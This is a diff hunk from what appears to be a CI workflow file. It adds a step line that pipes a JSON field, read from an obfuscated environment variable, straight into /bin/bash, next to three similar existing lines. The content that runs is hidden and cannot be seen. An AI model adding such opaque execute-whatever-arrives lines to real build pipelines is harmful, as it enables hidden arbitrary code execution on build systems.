@@ -32,6 +32,7 @@ jobs:
           echo $k12 | jq -r .kun5 | /bin/bash
           printf '%s' "$zxgl15" | jq -r .ldlyq2129 | /bin/bash
           printf '%s' "$wlcrn3" | jq -r .i1 | /bin/bash
+          printf '%s' "$wn7" | jq -r .c6934 | /bin/bash
 
       - name: Archive output
         if: always()
